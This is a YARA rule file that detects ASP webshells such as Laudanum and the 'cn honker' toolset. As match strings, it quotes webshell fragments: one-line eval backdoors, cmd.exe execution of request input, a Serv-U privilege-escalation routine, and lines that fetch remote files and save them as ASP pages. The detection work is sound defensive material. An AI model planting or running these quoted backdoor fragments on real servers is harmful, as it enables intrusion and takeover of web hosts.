rule Backdoor_Webshell_ASP_000690
{
    meta:
        description = "laudanum injector tools file.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
        $s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
        $s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii /* PEStudio Blacklist: strings */
        $s5 = "set folder = fso.GetFolder(path)" fullword ascii
        $s6 = "Set file = fso.GetFile(filepath)" fullword ascii
        
    condition:
        uint16(0) == 0x253c and filesize < 30KB and 5 of them
}
rule Backdoor_Webshell_ASP_000691
{
    meta:
        description = "laudanum injector tools shell.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "%ComSpec% /c dir" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "Server.ScriptTimeout = 180" fullword ascii /* PEStudio Blacklist: strings */
        $s5 = "cmd = Request.Form(\"cmd\")" fullword ascii /* PEStudio Blacklist: strings */
        $s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
        $s7 = "Dim wshell, intReturn, strPResult" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 15KB and 4 of them
}
rule Backdoor_Webshell_ASP_000692
{
    meta:
        description = "laudanum injector tools proxy.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
        $s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii /* PEStudio Blacklist: strings */
        $s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii /* PEStudio Blacklist: strings */
        $s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 50KB and all of them
}
rule Backdoor_Webshell_ASP_000693
{
    meta:
        description = "laudanum injector tools dns.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "command = \"nslookup -type=\" & qtype & \" \" & query " fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "Set objCmd = objWShell.Exec(command)" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "Response.Write command & \"<br>\"" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "<form name=\"dns\" method=\"POST\">" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 21KB and all of them
}
rule Backdoor_Webshell_ASP_000694
{
    meta:
        description = "cn honker pentest toolset get.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "file.writeline  szTime + \" HostName:\" + szhostname + \" IP:\" + userip+\":\"+n" ascii /* PEStudio Blacklist: strings */
        $s3 = "set file=fs.OpenTextFile(server.MapPath(\"WinlogonHack.txt\"),8,True)" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 3KB and all of them
}
rule Backdoor_Webshell_ASP_000695
{
    meta:
        description = "cn honker pentest toolset asp3.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", Tru" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 444KB and all of them
}
rule Backdoor_Webshell_ASP_000696
{
    meta:
        description = "cn honker pentest toolset assembly.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "response.write oScriptlhn.exec(\"cmd.exe /c\" & request(\"c\")).stdout.readall" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 1KB and all of them
}
rule Backdoor_Webshell_ASP_000697
{
    meta:
        description = "cn honker pentest toolset jmpost.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 9KB and all of them
}
rule Backdoor_Webshell_ASP_000698
{
    meta:
        description = "cn honker pentest toolset web.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>" fullword ascii
        
    condition:
        filesize < 13KB and all of them
}
rule Backdoor_Webshell_ASP_000699
{
    meta:
        description = "cn honker pentest toolset wshell-asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "hello word !  " fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "root.asp " fullword ascii
        
    condition:
        filesize < 5KB and all of them
}
rule Backdoor_Webshell_ASP_000700
{
    meta:
        description = "cn honker pentest toolset asp404.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></t" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 113KB and all of them
}
rule Backdoor_Webshell_ASP_000701
{
    meta:
        description = "cn honker pentest toolset serv-u asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii /* PEStudio Blacklist: strings */
        $s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun lov" ascii /* PEStudio Blacklist: strings */
        $s3 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\"" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 30KB and 2 of them
}
rule Backdoor_Webshell_ASP_000702
{
    meta:
        description = "cn honker pentest toolset su7.x-9.x.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "returns=httpopen(\"LoginID=\"&user&\"&FullName=&Password=\"&pass&\"&ComboPasswor" ascii /* PEStudio Blacklist: strings */
        $s1 = "returns=httpopen(\"\",\"POST\",\"http://127.0.0.1:\"&port&\"/Admin/XML/User.xml?" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 59KB and all of them
}
rule Backdoor_Webshell_ASP_000703
{
    meta:
        description = "cn honker pentest toolset asp4.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
        $s6 = "Response.Cookies(Cookie_Login) = sPwd" fullword ascii /* PEStudio Blacklist: strings */
        $s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 150KB and all of them
}
rule Backdoor_Webshell_ASP_000704
{
    meta:
        description = "cn honker pentest toolset serv-u 2 admin by lake2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/lake2\", True" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "response.write \"FTP user lake  pass admin123 :)<br><BR>\"" fullword ascii /* PEStudio Blacklist: strings */
        $s8 = "<p>Serv-U Local Get SYSTEM Shell with ASP" fullword ascii /* PEStudio Blacklist: strings */
        $s9 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vb" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 17KB and 2 of them
}
rule Backdoor_Webshell_ASP_000705
{
    meta:
        description = "cn honker pentest toolset serv-u_by_goldsun.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True," ascii /* PEStudio Blacklist: strings */
        $s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii /* PEStudio Blacklist: strings */
        $s3 = "127.0.0.1:<%=port%>," fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&\":\"&request.serve" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 30KB and 2 of them
}
rule Backdoor_Webshell_ASP_000706
{
    meta:
        description = "cn honker pentest toolset hy2006a.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s15 = "Const myCmdDotExeFile = \"command.com\"" fullword ascii /* PEStudio Blacklist: strings */
        $s16 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 406KB and all of them
}
rule Backdoor_Webshell_ASP_000707
{
    meta:
        description = "cn honker pentest toolset serv-u_by_goldsun.asp, asp3.txt, serv-u asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        super_rule = 1
        
    strings:
        $s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii
        
    condition:
        filesize < 444KB and all of them
}
rule Backdoor_Webshell_ASP_000708
{
    meta:
        description = "cn honker pentest toolset asp4.txt, asp4.txt, mssql_.asp, mssql_.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        super_rule = 1
        
    strings:
        $s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii /* PEStudio Blacklist: strings */
        $s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
        $s2 = "Set Conn = Nothing " fullword ascii
        
    condition:
        filesize < 341KB and all of them
}
rule Backdoor_Webshell_ASP_000709
{
    meta:
        description = "cn honker pentest toolset injection.exe, jmcook.asp, jmpost.asp, manualinjection.exe"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        super_rule = 1
        
    strings:
        $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii
        
    condition:
        filesize < 7342KB and all of them
}
rule Backdoor_Webshell_ASP_000710
{
    meta:
        description = "cn honker pentest toolset asp2.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "webshell</font> <font color=#00FF00>" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "Userpwd = \"admin\"   'User Password" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 10KB and all of them
}
rule Backdoor_Webshell_ASP_000711
{
    meta:
        description = "cn honker pentest toolset shell.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
        
    condition:
        filesize < 1KB and all of them
}
rule Backdoor_Webshell_ASP_000712
{
    meta:
        description = "cn honker pentest toolset mssql.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "sqlpass=request(\"sqlpass\")" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 3KB and all of them
}
rule Backdoor_Webshell_ASP_000713
{
    meta:
        description = "cn honker pentest toolset asp1.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "SItEuRl=" ascii
        $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "Server.ScriptTimeout=" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 200KB and all of them
}
rule Backdoor_Webshell_ASP_000714
{
    meta:
        description = "chinese hacktool one.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "<%eval request(" fullword ascii
        
    condition:
        filesize < 50 and all of them
}
rule Backdoor_Webshell_ASP_000715
{
    meta:
        description = "chinese hacktool diy.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s5 = ".black {" fullword ascii
        
    condition:
        uint16(0) == 0x253c and filesize < 10KB and all of them
}
rule Backdoor_Webshell_ASP_000716
{
    meta:
        description = "chinese hacktool temp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
        $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
        $s2 = "o.language = \"vbscript\"" fullword ascii
        $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
        
    condition:
        filesize < 1KB and all of them
}
rule Backdoor_Webshell_ASP_000717
{
    meta:
        description = "chinese hacktool asp.html"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
        $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
        $s3 = "function Command(cmd, str){" fullword ascii
        
    condition:
        filesize < 100KB and all of them
}
rule Backdoor_Webshell_ASP_000718
{
    meta:
        description = "chinese hacktool asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
        $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
        
    condition:
        uint16(0) == 0x253c and filesize < 100KB and all of them
}
rule Backdoor_Webshell_ASP_000719
{
    meta:
        description = "chinese hacktool asp1.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
        $s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
        $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
        
    condition:
        filesize < 70KB and 2 of them
}
rule Backdoor_Webshell_ASP_000720
{
    meta:
        description = "cmd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
        $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")"
        $s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
        $s5 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)"
        $s6 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000721
{
    meta:
        description = "ice.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%eval request(\"ice\")%>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000722
{
    meta:
        description = "shell.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">"
        $s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000723
{
    meta:
        description = "efso_2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
        
        $a0 = "Ejder was HERE"
        $a1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
        
    condition:
        $s0 or all of ($a*)
}
rule Backdoor_Webshell_ASP_000724
{
    meta:
        description = "server variables.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "<% For Each Vars In Request.ServerVariables %>"
        $s9 = "Variable Name</B></font></p>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000725
{
    meta:
        description = "mdb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "<% execute request(\"ice\")%>a "
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000726
{
    meta:
        description = "ice.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000727
{
    meta:
        description = "indexx.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000728
{
    meta:
        description = "01.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%eval request(\"pass\")%>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000729
{
    meta:
        description = "404.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000730
{
    meta:
        description = "cmd_asp_5.1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000731
{
    meta:
        description = "aspydrv.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
        
        $a0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
        $a1 = "password"
        $a2 = "session(\"shagman\")="
        
    condition:
        $s0 or 2 of ($a*)
}
rule Backdoor_Webshell_ASP_000732
{
    meta:
        description = "ntdaddy.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 =  "if  FP  =  \"RefreshFolder\"  or  "
        $s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000733
{
    meta:
        description = "elmaliseker.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
        $s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000734
{
    meta:
        description = "remexp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
        $s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000735
{
    meta:
        description = "1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "!22222222222222222222222222222222222222222222222222"
        $s8 = "<%eval request(\"pass\")%>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000736
{
    meta:
        description = "tool.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
        $s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
        $s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000737
{
    meta:
        description = "zehir4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000738
{
    meta:
        description = "mumaasp.com.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000739
{
    meta:
        description = "up.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
        $s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000740
{
    meta:
        description = "zehir.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000741
{
    meta:
        description = "redirect.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000742
{
    meta:
        description = "1d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000743
{
    meta:
        description = "ajn.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf"
        $s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000744
{
    meta:
        description = "list.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">"
        $s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000745
{
    meta:
        description = "dabao.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
        $s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000746
{
    meta:
        description = "inderxer.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000747
{
    meta:
        description = "rader.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
        $s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000748
{
    meta:
        description = "elmaliseker backd00r.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
        $s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000749
{
    meta:
        description = "hkmjj.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  "
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000750
{
    meta:
        description = "ajan.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
        $s1 = "c:\\downloaded.zip"
        $s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)"
        $s3 = "http://www35.websamba.com/cybervurgun/"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000751
{
    meta:
        description = "generated from file con2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
        $s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
        
    condition:
        1 of them
}
